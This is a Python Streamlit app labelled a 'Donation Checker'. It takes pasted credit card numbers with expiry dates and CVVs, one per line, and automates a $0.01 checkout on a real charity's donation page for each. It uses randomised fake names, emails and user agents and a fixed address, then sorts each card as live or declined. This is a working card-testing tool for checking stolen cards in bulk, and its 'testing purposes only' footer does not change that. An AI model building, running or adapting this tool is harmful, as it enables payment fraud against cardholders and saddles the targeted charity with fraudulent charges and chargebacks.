import streamlit as st
import requests
import re
import time
import random
import string
import json

# Set page configuration
st.set_page_config(
    page_title="Donation Checker with Debug",
    page_icon="💰",
    layout="wide"
)

# Custom CSS for better appearance
st.markdown("""
<style>
    .success { padding: 10px; border-radius: 5px; background-color: #d4edda; border: 1px solid #c3e6cb; color: #155724; }
    .error { padding: 10px; border-radius: 5px; background-color: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; }
    .info { padding: 10px; border-radius: 5px; background-color: #cce5ff; border: 1px solid #b8daff; color: #004085; }
    .debug-log { font-family: monospace; font-size: 12px; white-space: pre-wrap; padding: 10px; background-color: #f8f9fa; border-radius: 5px; margin-top: 10px; overflow-y: auto; max-height: 400px; }
    .step-header { font-weight: bold; color: #4a6cf7; margin-top: 5px; }
    .step-detail { margin-left: 15px; color: #6c757d; }
    .warning { color: #856404; }
    .error-msg { color: #721c24; }
    .success-msg { color: #155724; }
</style>
""", unsafe_allow_html=True)

# Application title and description
st.title("💳 Donation Checker with Debug")
st.markdown("Enter credit card details to test donations. Format: `XXXXXXXXXXXXXXXX|MM|YY|CVV`")

# Helper functions
def generate_random_email():
    username = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
    return f"{username}@{random.choice(domains)}"

def generate_random_name():
    first_names = ["John", "Mary", "James", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "William", "Elizabeth"]
    last_names = ["Smith", "Johnson", "Williams", "Jones", "Brown", "Davis", "Miller", "Wilson", "Moore", "Taylor"]
    return f"{random.choice(first_names)} {random.choice(last_names)}"

def generate_user_agent():
    try:
        ua = UserAgent()
        return ua.random
    except:
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]
        return random.choice(user_agents)

def get_card_type(card_number):
    if card_number.startswith('4'):
        return 'Visa'
    elif card_number.startswith('5'):
        return 'MasterCard'
    elif card_number.startswith('3'):
        return 'Amex'
    elif card_number.startswith('6'):
        return 'Discover'
    else:
        return 'Unknown'

# Create debug container that will be populated during processing
debug_container = st.empty()

# Main processing function with enhanced debugging
def process_donation_with_debug(cc_data, debug_log):
    logs = []
    
    def log(message, level="INFO"):
        timestamp = time.strftime("%H:%M:%S")
        prefix = {
            "INFO": "ℹ️",
            "WARN": "⚠️",
            "ERROR": "❌",
            "SUCCESS": "✅",
            "STEP": "🔄"
        }.get(level, "ℹ️")
        
        log_entry = f"[{timestamp}] {prefix} {message}"
        logs.append(log_entry)
        
        # Update the debug log in real-time if enabled
        if debug_log:
            debug_html = "<div class='debug-log'>" + "<br>".join([
                f"<span class='{level.lower()}-msg'>{entry}</span>" if level in entry else entry 
                for entry in logs
            ]) + "</div>"
            debug_container.markdown(debug_html, unsafe_allow_html=True)
    
    try:
        log("Starting donation process", "STEP")
        
        # Parse card data
        parts = cc_data.strip().split("|")
        if len(parts) < 4:
            log("Invalid card format", "ERROR")
            return "Error: Invalid card format. Use: XXXXXXXXXXXXXXXX|MM|YY|CVV", logs
        
        # Extract card details
        cc = parts[0]
        mm = parts[1]
        yy = parts[2]
        cvc = parts[3]
        
        log(f"Card parsed: {cc[:6]}XXXXXX{cc[-4:]} | {mm}/{yy} | CVV: {cvc}")
        
        # Format expiration year
        if "20" in yy:
            yy = yy.split("20")[1]
            log(f"Reformatted year to: {yy}")
        
        # Create a new session for the requests
        session = requests.Session()
        
        # Generate random user data
        user_agent = generate_user_agent()
        email = generate_random_email()
        name1 = generate_random_name()
        card_type = get_card_type(cc)
        
        log(f"Generated user data:")
        log(f"  Email: {email}")
        log(f"  Name: {name1}")
        log(f"  Card Type: {card_type}")
        
        # Step 1: Visit the donation page
        log("STEP 1: Visiting donation page", "STEP")
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'user-agent': user_agent,
        }
        
        req = session.get('https://www.ywampublishing.com/p-1649-prison-donation-project.aspx', headers=headers)
        
        log(f"Initial page status code: {req.status_code}")
        if req.status_code != 200:
            log(f"Warning: Unexpected status code: {req.status_code}", "WARN")
        
        time.sleep(2)
        
        # Step 2: Add donation to cart
        log("STEP 2: Adding donation to cart", "STEP")
        
        headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'user-agent': user_agent,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'ProductId': '1649',
            'VariantId': '1681',
            'CartRecordId': '0',
            'UpsellProducts': '',
            'ReturnUrl': '/p-1649-prison-donation-project.aspx',
            'IsWishlist': 'false',
            'TextOption': email,
            'CustomerEnteredPrice': '0.01',
        }
        
        log(f"Cart data:")
        log(f"  Email: {email}")
        log(f"  Price: $0.01")
        
        req1 = session.post('https://www.ywampublishing.com/minicart/ajaxaddtocart', headers=headers, data=data)
        
        log(f"Add to cart status code: {req1.status_code}")
        if req1.status_code != 200:
            log(f"Warning: Add to cart returned {req1.status_code}", "WARN")
        
        # Try to extract cart item ID from the response if JSON
        try:
            cart_response = req1.json()
            log(f"Cart response: {json.dumps(cart_response, indent=2)}")
            if 'success' in cart_response:
                log("Cart addition successful", "SUCCESS")
            else:
                log("Cart addition may have failed", "WARN")
        except:
            log("Cart response is not JSON format", "WARN")
        
        # Look for cart ID in response
        cart_id_match = re.search(r'id="cartItemId" value="([^"]+)"', req1.text)
        cart_id = cart_id_match.group(1) if cart_id_match else '556169'  # Use default if not found
        log(f"Cart item ID: {cart_id}")
        
        time.sleep(2)
        
        # Step 3: Update mini cart with the correct cart ID
        log("STEP 3: Updating mini cart", "STEP")
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': user_agent,
        }
        
        params = {
            'cartType': 'ShoppingCart',
        }
        
        data = {
            f'CartItems[0].Id': cart_id,
            f'CartItems[0].ProductId': '1649',
            f'CartItems[0].VariantId': '1681',
            f'CartItems[0].ChosenColorSkuModifier': '',
            f'CartItems[0].ChosenSizeSkuModifier': '',
            f'CartItems[0].TextOption': email,
            f'CartItems[0].Quantity': '1',
            'returnUrl': '/p-1649-prison-donation-project.aspx',
        }
        
        log(f"Updating cart with item ID: {cart_id}")
        
        req2 = session.post(
            'https://www.ywampublishing.com/minicart/updateminicart',
            params=params,
            headers=headers,
            data=data,
        )
        
        log(f"Update mini cart status code: {req2.status_code}")
        if req2.status_code != 200:
            log(f"Warning: Update cart returned {req2.status_code}", "WARN")
            
        time.sleep(2)
        
        # Step 4: Proceed to checkout
        log("STEP 4: Proceeding to checkout and setting email", "STEP")
        
        # First check if we need to visit the cart page first
        cart_page = session.get('https://www.ywampublishing.com/shoppingcart.aspx', 
                              headers={'user-agent': user_agent})
        log(f"Cart page status code: {cart_page.status_code}")
        
        # Now proceed to checkout and set email
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': user_agent,
        }
        
        data = {
            'Email': email,
        }
        
        log(f"Setting email for checkout: {email}")
        
        req3 = session.post('https://www.ywampublishing.com/checkoutaccount/setemail', headers=headers, data=data)
        
        log(f"Set email status code: {req3.status_code}")
        if req3.status_code != 200:
            log(f"Warning: Set email returned {req3.status_code}", "WARN")
        
        # Save this response to analyze
        with open("checkout_email_response.html", "w", encoding="utf-8") as f:
            f.write(req3.text)
        log("Saved checkout email response for analysis")
        
        # Extract verification token for later use
        token_match = re.search(r'name="__RequestVerificationToken" type="hidden" value="([^"]+)"', req3.text)
        if not token_match:
            log("Failed to extract verification token!", "ERROR")
            return "Error: Could not extract verification token", logs
            
        tokenpayment = token_match.group(1)
        log(f"Extracted token: {tokenpayment[:10]}...")
        
        time.sleep(2)
        
        # Step 5: Set shipping address (missing in original code)
        log("STEP 5a: Setting shipping address", "STEP")
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': user_agent,
        }
        
        params = {
            'makePrimary': 'True',
            'addressType': 'Shipping',  # This is different from original
            'returnurl': '/shoppingcart.aspx',
        }
        
        data = {
            'Address.Id': '',
            'MakePrimary': 'True',
            'Address.Country': 'United States',
            'Address.Name': name1,
            'Address.Phone': '(863) 983-8465',
            'Address.Address1': '532 E Obispo Ave',
            'Address.Address2': '',
            'Address.Suite': '',
            'Address.Company': '',
            'Address.Zip': '33440',
            'Address.City': 'Clewiston',
            'Address.State': 'FL',
        }
        
        log("Setting shipping address:")
        log(f"  Name: {name1}")
        log("  Address: 532 E Obispo Ave, Clewiston, FL 33440")
        
        req4a = session.post('https://www.ywampublishing.com/address/detail', params=params, headers=headers, data=data)
        
        log(f"Set shipping address status code: {req4a.status_code}")
        if req4a.status_code != 200:
            log(f"Warning: Set shipping address returned {req4a.status_code}", "WARN")
            
        # Look for any field validation errors
        validation_errors = re.findall(r'<span class="field-validation-error"[^>]*>(.*?)</span>', req4a.text)
        if validation_errors:
            log("Validation errors found on shipping address:", "WARN")
            for error in validation_errors:
                log(f"  - {error.strip()}", "WARN")
        
        time.sleep(2)
        
        # Step 5b: Set billing address
        log("STEP 5b: Setting billing address", "STEP")
        
        params = {
            'makePrimary': 'True',
            'addressType': 'Billing',
            'returnurl': '/shoppingcart.aspx',
        }
        
        data = {
            'Address.Id': '',
            'MakePrimary': 'True',
            'Address.Country': 'United States',
            'Address.Name': name1,
            'Address.Phone': '(863) 983-8465',
            'Address.Address1': '532 E Obispo Ave',
            'Address.Address2': '',
            'Address.Suite': '',
            'Address.Company': '',
            'Address.Zip': '33440',
            'Address.City': 'Clewiston',
            'Address.State': 'FL',
        }
        
        log("Setting billing address:")
        log("  Same as shipping address")
        
        req4b = session.post('https://www.ywampublishing.com/address/detail', params=params, headers=headers, data=data)
        
        log(f"Set billing address status code: {req4b.status_code}")
        if req4b.status_code != 200:
            log(f"Warning: Set billing address returned {req4b.status_code}", "WARN")
            
        # Look for any field validation errors
        validation_errors = re.findall(r'<span class="field-validation-error"[^>]*>(.*?)</span>', req4b.text)
        if validation_errors:
            log("Validation errors found on billing address:", "WARN")
            for error in validation_errors:
                log(f"  - {error.strip()}", "WARN")
        
        time.sleep(2)
        
        # Step 6: Submit credit card
        log("STEP 6: Submitting credit card information", "STEP")
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': user_agent,
        }
        
        data = {
            'Name': name1,
            'Number': cc,
            'CardType': card_type,
            'ExpirationDate': f'{mm} / {yy}',
            'Cvv': cvc,
            'SaveCreditCardNumber': 'false',  # Changed from array to single value
        }
        
        log("Submitting credit card:")
        log(f"  Card: {cc[:6]}XXXXXX{cc[-4:]}")
        log(f"  Exp: {mm}/{yy}")
        log(f"  Type: {card_type}")
        
        req5 = session.post(
            'https://www.ywampublishing.com/checkoutcreditcard/creditcard',
            headers=headers,
            data=data,
        )
        
        log(f"Credit card submission status code: {req5.status_code}")
        if req5.status_code != 200:
            log(f"Warning: Card submission returned {req5.status_code}", "WARN")
        
        # Look for any field validation errors
        validation_errors = re.findall(r'<span class="field-validation-error"[^>]*>(.*?)</span>', req5.text)
        if validation_errors:
            log("Validation errors found on credit card form:", "WARN")
            for error in validation_errors:
                log(f"  - {error.strip()}", "WARN")
        
        # Save this response to analyze
        with open("card_submission_response.html", "w", encoding="utf-8") as f:
            f.write(req5.text)
        log("Saved card submission response for analysis")
        
        time.sleep(2)
        
        # Step 7: Check if we need to select shipping method
        log("STEP 7a: Checking for shipping method selection", "STEP")
        
        # First check if we need a shipping method
        shipping_page = session.get('https://www.ywampublishing.com/checkoutshipping/shippingmethod', 
                                  headers={'user-agent': user_agent})
        
        log(f"Shipping method page status code: {shipping_page.status_code}")
        
        # If shipping method is required, select one
        if 'ShippingMethodId' in shipping_page.text:
            log("Shipping method selection required", "INFO")
            
            # Extract available shipping methods
            shipping_methods = re.findall(r'value="(\d+)"[^>]*>[^<]*?(\$\d+\.\d+)', shipping_page.text)
            
            if shipping_methods:
                # Choose the first (cheapest) shipping method
                shipping_id = shipping_methods[0][0]
                shipping_cost = shipping_methods[0][1]
                
                log(f"Selecting shipping method: ID {shipping_id}, Cost {shipping_cost}")
                
                # Submit the shipping method
                shipping_data = {
                    'ShippingMethodId': shipping_id,
                }
                
                shipping_response = session.post(
                    'https://www.ywampublishing.com/checkoutshipping/shippingmethod',
                    headers={'content-type': 'application/x-www-form-urlencoded', 'user-agent': user_agent},
                    data=shipping_data
                )
                
                log(f"Shipping method selection status code: {shipping_response.status_code}")
            else:
                log("No shipping methods found, but they might be required", "WARN")
        else:
            log("No shipping method selection required")
        
        # Step 7: Place order
        log("STEP 7b: Placing final order", "STEP")
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': user_agent,
            'referer': 'https://www.ywampublishing.com/checkout/index',  # Added referer
        }
        
        data = {
            '__RequestVerificationToken': tokenpayment,
            'OrderNotes': '',
            'OkToEmailSelected': 'false',
        }
        
        log(f"Placing order with token: {tokenpayment[:10]}...")
        
        req6 = session.post('https://www.ywampublishing.com/checkout/placeorder', headers=headers, data=data)
        
        log(f"Place order status code: {req6.status_code}")
        if req6.status_code != 200:
            log(f"Warning: Place order returned {req6.status_code}", "WARN")
        
        # Save the full response for detailed analysis
        with open("place_order_response.html", "w", encoding="utf-8") as f:
            f.write(req6.text)
        log("Saved order placement response for analysis")
        
        # Extract result from response
        error_match = re.search(r'<div class="notice notice-failure">\s*(.*?)\s*</div>', req6.text)
        if error_match:
            result = error_match.group(1)
            log(f"Order failed: {result}", "ERROR")
            
            # Try to detect missing fields
            missing_fields = re.findall(r'<span class="field-validation-error"[^>]*data-valmsg-for="([^"]+)"', req6.text)
            if missing_fields:
                log("Missing required fields in final checkout:", "ERROR")
                for field in missing_fields:
                    log(f"  - {field}", "ERROR")
            
            # Look for checkout form errors
            checkout_errors = re.findall(r'<div class="validation-summary-errors"[^>]*>(.*?)</div>', req6.text, re.DOTALL)
            if checkout_errors:
                for error_block in checkout_errors:
                    error_items = re.findall(r'<li>(.*?)</li>', error_block)
                    for item in error_items:
                        log(f"Checkout error: {item}", "ERROR")
            
            return f"DECLINED: {result}", logs
        
        success_match = re.search(r'<div class="notice notice-success">\s*(.*?)\s*</div>', req6.text)
        if success_match:
            result = success_match.group(1)
            log(f"Order successful: {result}", "SUCCESS")
            return f"SUCCESS: {result}", logs
        
        # Check if order was created despite no success message
        order_number_match = re.search(r'Order\s+Number:\s+(\d+)', req6.text)
        if order_number_match:
            order_number = order_number_match.group(1)
            log(f"Order created with number: {order_number}", "SUCCESS")
            return f"SUCCESS: Order created with number {order_number}", logs
        
        # If neither success nor error match found
        log("Could not determine order result", "WARN")
        return "UNKNOWN RESPONSE: Unable to determine the result", logs
    
    except Exception as e:
        import traceback
        error_trace = traceback.format_exc()
        log(f"Exception occurred: {str(e)}", "ERROR")
        log(f"Traceback: {error_trace}", "ERROR")
        return f"Error: {str(e)}", logs

# Create UI components
st.markdown("### Card Information")

cc_input = st.text_area("Credit Card Information (one per line)", height=150, 
                       placeholder="4111111111111111|01|25|123\n5111111111111111|02|26|456")

col1, col2, col3 = st.columns(3)
with col1:
    process_button = st.button("Process Cards", type="primary")
with col2:
    clear_button = st.button("Clear Results")
with col3:
    debug_mode = st.checkbox("Enable Debug Mode", value=True)

# Initialize or retrieve session state for results
if 'results' not in st.session_state:
    st.session_state.results = {}

# Clear results if requested
if clear_button:
    st.session_state.results = {}
    st.success("Results cleared")
    debug_container.empty()

# Process the cards
if process_button and cc_input:
    cards = cc_input.strip().split('\n')
    
    if len(cards) > 0:
        # Create a progress bar
        progress_bar = st.progress(0)
        status_text = st.empty()
        
        for i, card in enumerate(cards):
            if card.strip():
                status_text.text(f"Processing card {i+1} of {len(cards)}...")
                
                # Process the card with detailed debugging
                result, logs = process_donation_with_debug(card.strip(), debug_mode)
                
                # Store the result and logs
                st.session_state.results[card] = {
                    "result": result,
                    "logs": logs
                }
                
                # Update progress
                progress_bar.progress((i + 1) / len(cards))
        
        # Complete the process
        status_text.text("Processing complete!")
        time.sleep(1)
        status_text.empty()
        progress_bar.empty()

# Display results
if st.session_state.results:
    st.subheader("Results")
    
    # Count results by type
    success_count = sum(1 for item in st.session_state.results.values() if item["result"].startswith("SUCCESS"))
    declined_count = sum(1 for item in st.session_state.results.values() if item["result"].startswith("DECLINED"))
    error_count = sum(1 for item in st.session_state.results.values() if item["result"].startswith("Error"))
    
    # Create stats columns
    col1, col2, col3, col4 = st.columns(4)
    col1.metric("Total", len(st.session_state.results))
    col2.metric("Success", success_count)
    col3.metric("Declined", declined_count)
    col4.metric("Errors", error_count)
    
    # Display each result with collapsible logs
    for card, data in st.session_state.results.items():
        result = data["result"]
        logs = data["logs"]
        
        if result.startswith("SUCCESS"):
            st.markdown(f"""
            <div class="success">
                <strong>{card}</strong><br>
                {result}
            </div>
            """, unsafe_allow_html=True)
        elif result.startswith("DECLINED"):
            st.markdown(f"""
            <div class="error">
                <strong>{card}</strong><br>
                {result}
            </div>
            """, unsafe_allow_html=True)
        else:
            st.markdown(f"""
            <div class="info">
                <strong>{card}</strong><br>
                {result}
            </div>
            """, unsafe_allow_html=True)
        
        # Add collapsible logs
        with st.expander("View Processing Logs"):
            for log in logs:
                if "[STEP]" in log:
                    st.markdown(f"<div class='step-header'>{log}</div>", unsafe_allow_html=True)
                elif "[ERROR]" in log:
                    st.markdown(f"<div class='error-msg'>{log}</div>", unsafe_allow_html=True)
                elif "[WARN]" in log:
                    st.markdown(f"<div class='warning'>{log}</div>", unsafe_allow_html=True)
                elif "[SUCCESS]" in log:
                    st.markdown(f"<div class='success-msg'>{log}</div>", unsafe_allow_html=True)
                else:
                    st.text(log)
        
        st.markdown("---")

# Footer
st.markdown("---")
st.markdown("*This application is for testing purposes only.*")
